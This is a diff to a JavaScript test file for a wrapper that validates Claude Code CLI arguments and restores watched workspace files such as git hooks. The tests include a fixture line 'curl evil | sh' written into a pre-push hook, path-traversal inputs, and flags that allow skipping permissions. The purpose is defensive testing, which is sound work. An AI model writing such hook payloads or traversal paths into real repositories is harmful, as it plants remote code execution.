@@ -43,11 +43,12 @@ test('claude arguments: the SDK prefix, then only allowlisted --name=value / fla
     '--permission-mode=default', '--permission-mode=acceptEdits', '--permission-mode=plan', '--permission-mode=dontAsk',
     '--setting-sources=user,project,local', '--setting-sources=', `--session-id=${SID}`, `--resume=${SID}`, `--resume-session-at=${SID}`,
     '--thinking=adaptive', '--effort=xhigh', '--max-turns=12', '--max-budget-usd=1.5', '--allowedTools=Bash(npm test:*)',
-    '--disallowedTools=WebFetch', '--include-partial-messages', '--fork-session', '--include-hook-events'];
+    '--disallowedTools=WebFetch', '--include-partial-messages', '--fork-session', '--include-hook-events',
+    '--allow-dangerously-skip-permissions'];   // (CODE_ALLOW_BYPASS: the page may switch a session to Bypass permissions)
   assert.equal(coded.checkClaudeArgs([...FIXED, ...ok]), null);
   const refused = ['--settings={"x":1}', '--mcp-config=/tmp/x.json', '--plugin-dir=/tmp', '--debug-file=/tmp/d', '--betas=x',
-    '--task-budget=10', '--managed-settings=x', '--add-dir=/', '--dangerously-skip-permissions', '--allow-dangerously-skip-permissions',
-    '--permission-mode=bypassPermissions', '--permission-mode=auto', '--model', '--model=', '--model=-x', '--model=a b',
+    '--task-budget=10', '--managed-settings=x', '--add-dir=/', '--dangerously-skip-permissions', '--allow-dangerously-skip-permissions=1',
+    '--permission-mode=bypassPermissions', '--permission-mode=auto', '--permission-mode=readOnly', '--permission-mode=manual', '--model', '--model=', '--model=-x', '--model=a b',
     '--model=x\ny', '--model=ü', `--session-id=${SID.toUpperCase()}`, '--resume=../../etc', '--setting-sources=user,policy',
     '--max-turns=0', '--max-turns=10000', '--max-budget-usd=-1', '--allowedTools=a\nb', '--include-partial-messages=1',
     '-p', 'positional', '--permission-prompt-tool=mcp__x', '--effort=ultra', '--thinking=enabled'];
@@ -321,4 +322,52 @@ test('orphans: a recorded child still running stream-json is ended at start; a r
   assert.deepEqual(coded.sweepOrphans({ kill: (pid, sig) => killed.push([pid, sig]) }), []);
   assert.deepEqual(killed, []);
   assert.deepEqual(fs.readdirSync(dir), []);
+});
+
+test('the watchlist (ws.sensitive / ws.restore): the watched files with hashes and copies, never through a link; put back only while unchanged', async () => {
+  const w = (p, t, mode = 0o644) => { fs.mkdirSync(path.dirname(path.join(WS, p)), { recursive: true }); fs.writeFileSync(path.join(WS, p), t, { mode }); fs.chmodSync(path.join(WS, p), mode); };
+  w('.git/config', '[core]\n'); w('.git/hooks/pre-commit.sample', 'sample'); w('.git/hooks/pre-push', 'echo push\n', 0o755);
+  w('.husky/pre-commit', 'npx lint-staged\n'); fs.mkdirSync(path.join(WS, '.husky/_'), { recursive: true });
+  w('package.json', '{"scripts":{"test":"x"}}'); w('.envrc', 'export A=1\n'); w('src/other.txt', 'not watched');
+  fs.mkdirSync(path.join(WS, '.vscode'), { recursive: true });
+  fs.symlinkSync(path.join(ROOT, 'outside', 'secret.txt'), path.join(WS, '.vscode', 'tasks.json'));   // a link: reported as one
+  let r = result(await talk(SOCK, [open({ op: 'ws.sensitive' })]));
+  const by = Object.fromEntries(r.files.map((f) => [f.path, f]));
+  assert.deepEqual(Object.keys(by).sort(), ['.envrc', '.git/config', '.git/hooks', '.git/hooks/pre-push', '.husky', '.husky/pre-commit', '.vscode/tasks.json', 'package.json']);
+  assert.equal(Buffer.from(by['.git/hooks/pre-push'].data, 'base64').toString(), 'echo push\n');
+  assert.equal(by['.git/hooks/pre-push'].mode & 0o777, 0o755);
+  assert.match(by['.git/config'].sha256, /^[0-9a-f]{64}$/);
+  assert.deepEqual([by['.vscode/tasks.json'].type, by['.vscode/tasks.json'].data, by['.vscode/tasks.json'].target], ['symlink', undefined, path.join(ROOT, 'outside', 'secret.txt')]);
+  assert.equal(by['.git/hooks'].type, 'dir');
+  // put back: a changed file (its old copy and mode), only while its hash is the one given
+  const before = by['.git/hooks/pre-push'];
+  w('.git/hooks/pre-push', 'curl evil | sh\n', 0o644);
+  const now = result(await talk(SOCK, [open({ op: 'ws.sensitive' })])).files.find((f) => f.path === '.git/hooks/pre-push');
+  r = result(await talk(SOCK, [open({ op: 'ws.restore', path: '.git/hooks/pre-push', ifSha256: before.sha256, data: before.data, mode: 0o755 })]));
+  assert.match(r.error, /changed again/, 'refused: it is not as the turn end saw it');
+  r = result(await talk(SOCK, [open({ op: 'ws.restore', path: '.git/hooks/pre-push', ifSha256: now.sha256, data: before.data, mode: 0o755 })]));
+  assert.equal(r.action, 'restored');
+  assert.equal(fs.readFileSync(path.join(WS, '.git/hooks/pre-push'), 'utf8'), 'echo push\n');
+  assert.equal(fs.statSync(path.join(WS, '.git/hooks/pre-push')).mode & 0o777, 0o755);
+  // a file that was not there: into the workspace trash (a link moved as a link, never its target)
+  w('.git/hooks/post-merge', 'x');
+  const pm = result(await talk(SOCK, [open({ op: 'ws.sensitive' })])).files.find((f) => f.path === '.git/hooks/post-merge');
+  r = result(await talk(SOCK, [open({ op: 'ws.restore', path: '.git/hooks/post-merge', ifSha256: pm.sha256, data: null })]));
+  assert.equal(r.action, 'trashed');
+  assert.equal(fs.existsSync(path.join(WS, '.git/hooks/post-merge')), false);
+  assert.ok(fs.existsSync(path.join(WS, r.trash)));
+  const link = by['.vscode/tasks.json'];
+  r = result(await talk(SOCK, [open({ op: 'ws.restore', path: '.vscode/tasks.json', ifSha256: link.sha256, data: null })]));
+  assert.equal(r.action, 'trashed');
+  assert.equal(fs.readFileSync(path.join(ROOT, 'outside', 'secret.txt'), 'utf8'), 'outside', 'the target is untouched');
+  // refused: not a watched file, a folder, through a linked folder
+  fs.mkdirSync(path.join(ROOT, 'outside', 'dotclaude'));
+  fs.symlinkSync(path.join(ROOT, 'outside', 'dotclaude'), path.join(WS, '.claude'));
+  for (const bad of [{ path: 'src/other.txt' }, { path: '../outside/secret.txt' }, { path: '.git/hooks' }, { path: '.git/hooks/x.sample' },
+    { path: '.claude/settings.json', data: Buffer.from('{}').toString('base64') }, { path: '.envrc', ifSha256: null, data: '!!' }]) {
+    assert.ok(result(await talk(SOCK, [open({ op: 'ws.restore', ...bad })])).error, JSON.stringify(bad));
+  }
+  assert.equal(fs.readdirSync(path.join(ROOT, 'outside', 'dotclaude')).length, 0, 'nothing written through the linked folder');
+  assert.equal(result(await talk(SOCK, [open({ op: 'ws.sensitive' })])).files.some((f) => f.path.startsWith('.claude/')), false, 'nor read through it');
+  fs.rmSync(path.join(WS, '.claude'));
 });
